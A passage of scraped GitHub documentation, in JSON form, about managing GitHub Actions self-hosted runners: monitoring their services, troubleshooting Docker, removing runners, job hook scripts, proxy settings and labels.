        "text": "For Windows-based self-hosted runners running the application as a service, you can use PowerShell to monitor their real-time activity. The service uses the naming conventionGitHub Actions Runner (<org>-<repo>.<runnerName>). You can also find the service's name by checking the.servicefile in the runner directory:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "PS C:\\actions-runner> Get-Content .service\nactions.runner.octo-org-octo-repo.runner01.service"
      },
      {
        "type": "paragraph",
        "text": "You can view the status of the runner in the WindowsServicesapplication (services.msc). You can also use PowerShell to check whether the service is running:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "PS C:\\actions-runner> Get-Service \"actions.runner.octo-org-octo-repo.runner01.service\" | Select-Object Name, Status\nName                                                  Status\n----                                                  ------\nactions.runner.octo-org-octo-repo.runner01.service    Running"
      },
      {
        "type": "paragraph",
        "text": "You can use PowerShell to check the recent activity of the self-hosted runner. In this example output, you can see the application start, receive a job namedtestAction, and then display the resulting status:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "PS C:\\actions-runner> Get-EventLog -LogName Application -Source ActionsRunnerService\n\n   Index Time          EntryType   Source                 InstanceID Message\n   ----- ----          ---------   ------                 ---------- -------\n     136 Mar 17 13:45  Information ActionsRunnerService          100 2020-03-17 13:45:48Z: Job Greeting completed with result: Succeeded\n     135 Mar 17 13:45  Information ActionsRunnerService          100 2020-03-17 13:45:34Z: Running job: testAction\n     134 Mar 17 13:41  Information ActionsRunnerService          100 2020-03-17 13:41:54Z: Listening for Jobs\n     133 Mar 17 13:41  Information ActionsRunnerService          100 û Connected to GitHub\n     132 Mar 17 13:41  Information ActionsRunnerService            0 Service started successfully.\n     131 Mar 17 13:41  Information ActionsRunnerService          100 Starting Actions Runner listener\n     130 Mar 17 13:41  Information ActionsRunnerService          100 Starting Actions Runner Service\n     129 Mar 17 13:41  Information ActionsRunnerService          100 create event log trace source for actions-runner service"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Monitoring the automatic update process"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you regularly check the automatic update process, as the self-hosted runner will not be able to process jobs if it falls below a certain version threshold. The self-hosted runner application automatically updates itself, but note that this process does not include any updates to the operating system or other software; you will need to separately manage these updates."
      },
      {
        "type": "paragraph",
        "text": "You can view the update activities in theRunner_log files. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "[Feb 12 12:37:07 INFO SelfUpdater] An update is available."
      },
      {
        "type": "paragraph",
        "text": "In addition, you can find more information in theSelfUpdatelog files located in the_diagdirectory where you installed the runner application."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting containers in self-hosted runners"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Checking that Docker is installed"
      },
      {
        "type": "paragraph",
        "text": "If your jobs require containers, then the self-hosted runner must be Linux-based and needs to have Docker installed. Check that your self-hosted runner has Docker installed and that the service is running."
      },
      {
        "type": "paragraph",
        "text": "You can usesystemctlto check the service status:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ sudo systemctl is-active docker.service\nactive"
      },
      {
        "type": "paragraph",
        "text": "If Docker is not installed, then dependent actions will fail with the following errors:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "[2020-02-13 16:56:10Z INFO DockerCommandManager] Which: 'docker'\n[2020-02-13 16:56:10Z INFO DockerCommandManager] Not found.\n[2020-02-13 16:56:10Z ERR  StepsRunner] Caught exception from step: System.IO.FileNotFoundException: File not found: 'docker'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Checking the Docker permissions"
      },
      {
        "type": "paragraph",
        "text": "If your job fails with the following error:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "dial unix /var/run/docker.sock: connect: permission denied"
      },
      {
        "type": "paragraph",
        "text": "Check that the self-hosted runner's service account has permission to use the Docker service. You can identify this account by checking the configuration of the self-hosted runner insystemd. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ sudo systemctl show -p User actions.runner.octo-org-octo-repo.runner01.service\nUser=runner-user"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Checking which Docker engine is installed on the runner"
      },
      {
        "type": "paragraph",
        "text": "If your build fails with the following error:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Error: Input required and not supplied: java-version"
      },
      {
        "type": "paragraph",
        "text": "Check which Docker engine is installed on your self-hosted runner. To pass the inputs of an action into the Docker container, the runner uses environment variables that might contain dashes as part of their names. The action may not be able to get the inputs if the Docker engine is not a binary executable, but is instead a shell wrapper or a link (for example, a Docker engine installed on Linux usingsnap). To address this error, configure your self-hosted runner to use a different Docker engine."
      },
      {
        "type": "paragraph",
        "text": "To check if your Docker engine was installed usingsnap, use thewhichcommand. In the following example, the Docker engine was installed usingsnap:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ which docker\n/snap/bin/docker"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/removing-self-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Removing a runner from a repository"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "This procedure permanently removes the self-hosted runner. If you only want to temporarily stop a runner from being assigned jobs, you can either shut down the machine or stop therunapplication. The runner will remain assigned in an \"Offline\" state, and won't execute any jobs until you restart the runner using therunapplication.",
          "A self-hosted runner is automatically removed from GitHub if it has not connected to GitHub Actions for more than 14 days. An ephemeral self-hosted runner is automatically removed from GitHub if it has not connected to GitHub Actions for more than 1 day.",
          "Just-in-time (JIT) runners can only run a single job. If JIT runners never run a job, they will automatically be removed. To remove a JIT runner before automatic removal, you must remove the JIT runner on GitHub."
        ]
      },
      {
        "type": "paragraph",
        "text": "To remove a self-hosted runner from a user repository you must be the repository owner. Organization owners can remove a runner from a repository in the organization."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you also have access to the self-hosted runner machine."
      },
      {
        "type": "paragraph",
        "text": "For information about how to remove a self-hosted runner with the REST API, seeREST API endpoints for self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Alternatively, if you don't have access to the repository or organization on GitHub to remove a runner, but you would like to re-use the runner machine, then you can delete the.runnerfile inside the self-hosted runner application directory (that is, the directory into which you downloaded and unpacked the runner software). This allows the runner to be registered without having to re-download the self-hosted runner application."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, click on the name of the runner you'd like to configure.",
          "ClickRemove.",
          "You will see instructions for removing the self-hosted runner. Complete either of the following steps to remove the runner, depending on whether it is still accessible:If you have access to the runner machine:Follow the on-screen instructions for your machine's operating system to run the removal command. The instructions include the required URL and an automatically-generated, time-limited token.The removal command does the following tasks:Removes the runner from GitHub.Removes any self-hosted runner application configuration files on the machine.Removes any services configured if not running in interactive mode.If you don't have access to the machine:ClickForce remove this runnerto force GitHub to remove the runner.",
          "If you have access to the runner machine:Follow the on-screen instructions for your machine's operating system to run the removal command. The instructions include the required URL and an automatically-generated, time-limited token.The removal command does the following tasks:Removes the runner from GitHub.Removes any self-hosted runner application configuration files on the machine.Removes any services configured if not running in interactive mode.",
          "Removes the runner from GitHub.",
          "Removes any self-hosted runner application configuration files on the machine.",
          "Removes any services configured if not running in interactive mode.",
          "If you don't have access to the machine:ClickForce remove this runnerto force GitHub to remove the runner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Removing a runner from an organization"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "This procedure permanently removes the self-hosted runner. If you only want to temporarily stop a runner from being assigned jobs, you can either shut down the machine or stop therunapplication. The runner will remain assigned in an \"Offline\" state, and won't execute any jobs until you restart the runner using therunapplication.",
          "A self-hosted runner is automatically removed from GitHub if it has not connected to GitHub Actions for more than 14 days. An ephemeral self-hosted runner is automatically removed from GitHub if it has not connected to GitHub Actions for more than 1 day.",
          "Just-in-time (JIT) runners can only run a single job. If JIT runners never run a job, they will automatically be removed. To remove a JIT runner before automatic removal, you must remove the JIT runner on GitHub."
        ]
      },
      {
        "type": "paragraph",
        "text": "To remove a self-hosted runner from an organization, you must be an organization owner. We recommend that you also have access to the self-hosted runner machine. For information about how to remove a self-hosted runner with the REST API, seeREST API endpoints for self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Alternatively, if you don't have access to the repository or organization on GitHub to remove a runner, but you would like to re-use the runner machine, then you can delete the.runnerfile inside the self-hosted runner application directory (that is, the directory into which you downloaded and unpacked the runner software). This allows the runner to be registered without having to re-download the self-hosted runner application."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, click on the name of the runner you'd like to configure.",
          "ClickRemove.",
          "You will see instructions for removing the self-hosted runner. Complete either of the following steps to remove the runner, depending on whether it is still accessible:If you have access to the runner machine:Follow the on-screen instructions for your machine's operating system to run the removal command. The instructions include the required URL and an automatically-generated, time-limited token.The removal command does the following tasks:Removes the runner from GitHub.Removes any self-hosted runner application configuration files on the machine.Removes any services configured if not running in interactive mode.If you don't have access to the machine:ClickForce remove this runnerto force GitHub to remove the runner.",
          "If you have access to the runner machine:Follow the on-screen instructions for your machine's operating system to run the removal command. The instructions include the required URL and an automatically-generated, time-limited token.The removal command does the following tasks:Removes the runner from GitHub.Removes any self-hosted runner application configuration files on the machine.Removes any services configured if not running in interactive mode.",
          "Removes the runner from GitHub.",
          "Removes any self-hosted runner application configuration files on the machine.",
          "Removes any services configured if not running in interactive mode.",
          "If you don't have access to the machine:ClickForce remove this runnerto force GitHub to remove the runner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Removing a runner from an enterprise"
      },
      {
        "type": "paragraph",
        "text": "If you use GitHub Enterprise Cloud, you can also remove runners from an enterprise. For more information, see theGitHub Enterprise Cloud documentation."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/running-scripts-before-or-after-a-job",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About pre- and post-job scripts"
      },
      {
        "type": "paragraph",
        "text": "You can automatically execute scripts on a self-hosted runner, either before a job runs, or after a job finishes running. You could use these scripts to support the job's requirements, such as building or tearing down a runner environment, or cleaning out directories. You could also use these scripts to track telemetry of how your runners are used."
      },
      {
        "type": "paragraph",
        "text": "The custom scripts are automatically triggered when a specific environment variable is set on the runner; the environment variable must contain the absolute path to the script. For more information, seeTriggering the scriptsbelow."
      },
      {
        "type": "paragraph",
        "text": "The following scripting languages are supported:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Bash:Usesbashand can fallback tosh. Executes by running-e {pathtofile}.",
          "PowerShell:Usespwshand can fallback topowershell. Executes by running-command \\\". '{pathtofile}'\\\"."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Writing the scripts"
      },
      {
        "type": "paragraph",
        "text": "Your custom scripts can use the following features:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Variables:Scripts have access to the default variables. The full webhook event payload can be found inGITHUB_EVENT_PATH. For more information, seeStore information in variables.",
          "Workflow commands:Scripts can use workflow commands. For more information, seeWorkflow commands for GitHub Actions. Scripts can also use environment files. For more information, seeEnvironment files."
        ]
      },
      {
        "type": "paragraph",
        "text": "Your script files must use a file extension for the relevant language, such as.shor.ps1, in order to run successfully."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Avoid using your scripts to output sensitive information to the console, as anyone with read access to the repository might be able to see the output in the UI logs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Handling exit codes"
      },
      {
        "type": "paragraph",
        "text": "For pre-job scripts, exit code0indicates that the script completed successfully, and the job will then proceed to run. If there is any other exit code, the job will not run and will be marked as failed. To see the results of your pre-job scripts, check the logs forSet up runnerentries. For more information on checking the logs, seeUsing workflow run logs."
      },
      {
        "type": "paragraph",
        "text": "Thecontinue-on-errorsetting is not supported for use by these scripts."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Triggering the scripts"
      },
      {
        "type": "paragraph",
        "text": "The custom scripts must be located on the runner, but should not be stored in theactions-runnerapplication directory. The scripts are executed in the security context of the service account that's running the runner service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The triggered scripts are processed synchronously, so they will block job execution while they are running."
      },
      {
        "type": "paragraph",
        "text": "The scripts are automatically executed when the runner has the following environment variables containing an absolute path to the script:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "ACTIONS_RUNNER_HOOK_JOB_STARTED: The script defined in this environment variable is triggered when a job has been assigned to a runner, but before the job starts running.",
          "ACTIONS_RUNNER_HOOK_JOB_COMPLETED: The script defined in this environment variable is triggered at the end of the job, after all the steps defined in the workflow have run."
        ]
      },
      {
        "type": "paragraph",
        "text": "To set these environment variables, you can either add them to the operating system, or add them to a file named.envwithin the self-hosted runner application directory (that is, the directory into which you downloaded and unpacked the runner software). Note that any change to the.envfile will require restarting the runner.\nFor example, the following.enventry will have the runner automatically run a script, saved as/opt/runner/cleanup_script.shon the runner machine, before each job runs:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "ACTIONS_RUNNER_HOOK_JOB_STARTED=/opt/runner/cleanup_script.sh"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The script defined inACTIONS_RUNNER_HOOK_JOB_COMPLETEDis executed at the end of the job, before the job completes. This makes it unsuitable for use cases that may interrupt a runner, such as deleting the runner machine as part of an autoscaling implementation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Permission denied"
      },
      {
        "type": "paragraph",
        "text": "If you get a \"permission denied\" error when you attempt to run a script, make sure that the script is executable. For example, in a terminal on Linux or macOS you can use the following command to make a file executable."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "chmod +x PATH/TO/FILE"
      },
      {
        "type": "paragraph",
        "text": "For information about using workflows to run scripts, seeAdding scripts to your workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "No timeout setting"
      },
      {
        "type": "paragraph",
        "text": "There is currently no timeout setting available for scripts executed byACTIONS_RUNNER_HOOK_JOB_STARTEDorACTIONS_RUNNER_HOOK_JOB_COMPLETED. As a result, you could consider adding timeout handling to your script."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Reviewing the workflow run log"
      },
      {
        "type": "paragraph",
        "text": "To confirm whether your scripts are executing, you can review the logs for that job. The scripts will be listed within separate steps for eitherSet up runnerorComplete runner, depending on which environment variable is triggering the script. For more information on checking the logs, seeUsing workflow run logs."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/supported-architectures-and-operating-systems-for-self-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Linux"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Red Hat Enterprise Linux 8 or later",
          "CentOS 8 or later",
          "Oracle Linux 8 or later",
          "Fedora 29 or later",
          "Debian 10 or later",
          "Ubuntu 20.04 or later",
          "Linux Mint 20 or later",
          "openSUSE 15.2 or later",
          "SUSE Enterprise Linux (SLES) 15 SP2 or later"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Windows"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Windows 10 64-bit",
          "Windows 11 64-bit",
          "Windows Server 2016 64-bit",
          "Windows Server 2019 64-bit",
          "Windows Server 2022 64-bit"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "macOS"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "macOS 11.0 (Big Sur) or later"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Supported processor architectures"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "x64- Linux, macOS, Windows.",
          "ARM64- Linux, macOS, Windows (currently in public preview).",
          "ARM32- Linux."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/usage-limits-for-self-hosted-runners",
    "content": [
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Job execution time- Each job in a workflow can run for up to 5 days of execution time. If a job reaches this limit, the job is terminated and fails to complete.",
          "Workflow run time- Each workflow run is limited to 35 days. If a workflow run reaches this limit, the workflow run is cancelled. This period includes execution duration, and time spent on waiting and approval.",
          "Job queue time- Each job for self-hosted runners that has been queued for at least 24 hours will be canceled. The actual time in queue can reach up to 48 hours before cancellation occurs. If a self-hosted runner does not start executing the job within this limit, the job is terminated and fails to complete.",
          "API requests- You can execute up to 1,000 requests to the GitHub API in an hour across all actions within a repository. If requests are exceeded, additional API calls will fail which might cause jobs to fail.",
          "Job matrix- A job matrix can generate a maximum of 256 jobs per workflow run. This limit applies to both GitHub-hosted and self-hosted runners.",
          "Workflow run queue- No more than 500 workflow runs can be queued in a 10 second interval per repository. If a workflow run reaches this limit, the workflow run is terminated and fails to complete.",
          "Registering self-hosted runners- You can have a maximum of 10,000 self-hosted runners in one runner group. If this limit is reached, adding a new runner will not be possible."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-a-proxy-server-with-self-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring a proxy server using environment variables"
      },
      {
        "type": "paragraph",
        "text": "If you need a self-hosted runner to communicate via a proxy server, the self-hosted runner application uses proxy configurations set in the following environment variables:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "https_proxy: Proxy URL for HTTPS traffic. You can also include basic authentication credentials, if required. For example:http://proxy.localhttp://192.168.1.1:8080http://username:password@proxy.local",
          "http://proxy.local",
          "http://192.168.1.1:8080",
          "http://username:password@proxy.local",
          "http_proxy: Proxy URL for HTTP traffic. You can also include basic authentication credentials, if required. For example:http://proxy.localhttp://192.168.1.1:8080http://username:password@proxy.local",
          "http://proxy.local",
          "http://192.168.1.1:8080",
          "http://username:password@proxy.local",
          "no_proxy: Comma separated list of hosts that should not use a proxy. Only hostnames are allowed inno_proxy, you cannot use IP addresses. For example:example.comexample.com,myserver.local:443,example.org",
          "example.com",
          "example.com,myserver.local:443,example.org"
        ]
      },
      {
        "type": "paragraph",
        "text": "The proxy environment variables are read when the self-hosted runner application starts, so you must set the environment variables before configuring or starting the self-hosted runner application. If your proxy configuration changes, you must restart the self-hosted runner application."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To avoid issues, it's good practice to treat environment variables as case sensitive, irrespective of the behavior of the operating system and shell you are using."
      },
      {
        "type": "paragraph",
        "text": "On Windows machines, the proxy environment variable names are case insensitive. On Linux and macOS machines, we recommend that you use all lowercase environment variables. If you have an environment variable in both lowercase and uppercase on Linux or macOS, for examplehttps_proxyandHTTPS_PROXY, the self-hosted runner application uses the lowercase environment variable."
      },
      {
        "type": "paragraph",
        "text": "The connection between self-hosted runners and GitHub is over HTTPS (port 443)."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a .env file to set the proxy configuration"
      },
      {
        "type": "paragraph",
        "text": "If setting environment variables is not practical, you can set the proxy configuration variables in a file named.envin the self-hosted runner application directory (that is, the directory into which you downloaded and unpacked the runner software). For example, this might be necessary if you want to configure the runner application as a service under a system account. When the runner application starts, it reads the variables set in.envfor the proxy configuration."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example.envproxy configuration"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "https_proxy=http://proxy.local:8080\nno_proxy=example.com,myserver.local:443"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting proxy configuration for Docker containers"
      },
      {
        "type": "paragraph",
        "text": "If you use Docker container actions or service containers in your workflows, you might also need to configure Docker to use your proxy server in addition to setting the above environment variables."
      },
      {
        "type": "paragraph",
        "text": "For information on the required Docker configuration, seeConfigure Docker to use a proxy serverin the Docker documentation."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-labels-with-self-hosted-runners",
    "content": [
      {
        "type": "paragraph",
        "text": "For information on how to use labels to route jobs to specific types of self-hosted runners, seeUsing self-hosted runners in a workflow. You can also route jobs to runners in a specific group. For more information, seeChoosing the runner for a job."
      },
      {
        "type": "paragraph",
        "text": "A self-hosted runner can be located in either your repository, organization, or enterprise account settings on GitHub. To manage a self-hosted runner, you must have the following permissions, depending on where the self-hosted runner was added:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "User repository:You must be the repository owner.",
          "Organization:You must be an organization owner.",
          "Organization repository:You must be an organization owner, or have admin access to the repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Actions Runner Controller does not support multiple labels, to find out more please read ourActions Runner Controller documentation"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a custom label"
      },
      {
        "type": "paragraph",
        "text": "You can create custom labels for runners at the repository and organization levels."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Creating a custom label for a repository runner",
          "Creating a custom label for an organization runner"
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Labels are case-insensitive."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Creating a custom label for a repository runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the repository where your self-hosted runner group is registered.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, click on the name of the runner you'd like to configure.",
          "In the \"Labels\" section, click.",
          "In the \"Find or create a label\" field, type the name of your new label and clickCreate new label. The custom label is created and assigned to the self-hosted runner. Custom labels can be removed from self-hosted runners, but they currently can't be manually deleted. Any unused labels that are not assigned to a runner will be automatically deleted within 24 hours."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Creating a custom label for an organization runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your self-hosted runner group is registered.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, click on the name of the runner you'd like to configure.",
          "In the \"Labels\" section, click.",
          "In the \"Find or create a label\" field, type the name of your new label and clickCreate new label. The custom label is created and assigned to the self-hosted runner. Custom labels can be removed from self-hosted runners, but they currently can't be manually deleted. Any unused labels that are not assigned to a runner will be automatically deleted within 24 hours."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Assigning a label to a self-hosted runner"
      },
      {
        "type": "paragraph",
        "text": "You can assign labels to self-hosted runners at the repository and organization levels."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Assigning a label to a repository runner",
          "Assigning a label to an organization runner"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Assigning a label to a repository runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the repository where your self-hosted runner group is registered.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Labels\" section, click.",
          "To assign a label to your self-hosted runner, in the \"Find or create a label\" field, click the label."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Assigning a label to an organization runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your self-hosted runner group is registered.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Labels\" section, click.",
          "To assign a label to your self-hosted runner, in the \"Find or create a label\" field, click the label."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Removing a custom label from a self-hosted runner"
      },
      {
        "type": "paragraph",
        "text": "You can remove custom labels from self-hosted runners at the repository and organization levels."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Removing a custom label from a repository runner",
          "Removing a custom label from an organization runner"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Removing a custom label from a repository runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the repository where your self-hosted runner group is registered.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Labels\" section, click.",
          "In the \"Find or create a label\" field, assigned labels are marked with theicon. Click on a marked label to unassign it from your self-hosted runner."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Removing a custom label from an organization runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your self-hosted runner group is registered.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Labels\" section, click.",
          "In the \"Find or create a label\" field, assigned labels are marked with theicon. Click on a marked label to unassign it from your self-hosted runner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Programmatically assign labels"
      },
      {
        "type": "paragraph",
        "text": "You can programmatically assign labels to a self-hosted runner after the runner is created, or during its initial configuration."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To programmatically assign labels to an existing self-hosted runner, you must use the REST API. For more information, seeREST API endpoints for self-hosted runners.",
          "To programmatically assign labels to a self-hosted runner during the initial runner configuration, you can pass label names to theconfigscript using thelabelsparameter.NoteYou cannot use theconfigscript to assign labels to an existing self-hosted runner.For example, this command assigns a label namedgpuwhen configuring a new self-hosted runner:./config.sh --url <REPOSITORY_URL> --token <REGISTRATION_TOKEN> --labels gpuThe label is created if it does not already exist. You can also use this approach to assign the default labels to runners, such asx64orlinux. When default labels are assigned using the configuration script, GitHub Actions accepts them as given and does not validate that the runner is actually using that operating system or architecture.You can use comma separation to assign multiple labels. For example:./config.sh --url <REPOSITORY_URL> --token <REGISTRATION_TOKEN> --labels gpu,x64,linuxNoteIf you replace an existing runner, then you must reassign any custom labels."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow",
    "content": [
      {
        "type": "paragraph",
        "text": "You can target self-hosted runners for use in a workflow based on the labels assigned to the runners, or their group membership, or a combination of these."
      },
      {
        "type": "paragraph",
        "text": "Important"
      },
      {
        "type": "paragraph",
        "text": "Runner Scale Sets do not support multiple labels, only the name of the runner can be used in place of a label. SeeDeploying runner scale sets with Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About self-hosted runner labels"
      },
      {
        "type": "paragraph",
        "text": "Labels allow you to send workflow jobs to specific types of self-hosted runners, based on their shared characteristics. For example, if your job requires a particular hardware component or software package, you can assign a custom label to a runner and then configure your job to only execute on runners with that label."
      },
      {
        "type": "paragraph",
        "text": "To specify a self-hosted runner for your job, configureruns-onin your workflow file with self-hosted runner labels."
      },
      {
        "type": "paragraph",
        "text": "Self-hosted runners may have theself-hostedlabel. When setting up a self-hosted runner, by default we will include the labelself-hosted. You may pass in the--no-default-labelsflag to prevent the self-hosted label from being applied. Labels can be used to create targeting options for runners, such as operating system or architecture, we recommend providing an array of labels that begins withself-hosted(this must be listed first) and then includes additional labels as needed. When you specify an array of labels, jobs will be queued on runners that have all the labels that you specify."
      },
      {
        "type": "paragraph",
        "text": "Note that Actions Runner Controller does not support multiple labels and does not support theself-hostedlabel."
      },
      {
        "type": "paragraph",
        "text": "For information on creating custom and default labels, seeUsing labels with self-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About self-hosted runner groups"
      },
      {
        "type": "paragraph",
        "text": "For self-hosted runners defined at the organization level, you can group your runners with shared characteristics into a single runner group and then configure your job to target the runner group."
      },
      {
        "type": "paragraph",
        "text": "To specify a self-hosted runner group for your job, configureruns-on.groupin your workflow file."
      },
      {
        "type": "paragraph",
        "text": "For information on creating and managing runner groups, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing available runners for a repository"
      },
      {
        "type": "paragraph",
        "text": "If you haverepo: writeaccess to a repository, you can view a list of the runners available to the repository."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, under the \"Management\" section, clickRunners.",
          "Click theSelf hostedtab at the top of the list of runners.",
          "Review the list of available self-hosted runners for the repository. This list includes both self-hosted runners and runner scale sets created with Actions Runner Controller. For more information, seeAbout Actions Runner Controller.",
          "Optionally, to copy a runner's label to use it in a workflow, clickto the right of the runner, then clickCopy label."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Enterprise and organization owners can create runners from this page. To create a new runner, clickNew runnerat the top right of the list of runners to add runners to the repository."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeManaging larger runnersandAdding self-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using default labels to route jobs"
      },
      {
        "type": "paragraph",
        "text": "A self-hosted runner automatically receives certain labels when it is added to GitHub Actions. These are used to indicate its operating system and hardware platform:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "self-hosted: Default label applied to self-hosted runners.",
          "linux,windows, ormacOS: Applied depending on operating system.",
          "x64,ARM, orARM64: Applied depending on hardware architecture."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can use your workflow's YAML to send jobs to a combination of these labels. In this example, a self-hosted runner that matches all three labels will be eligible to run the job:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: [self-hosted, linux, ARM64]"
      },
      {
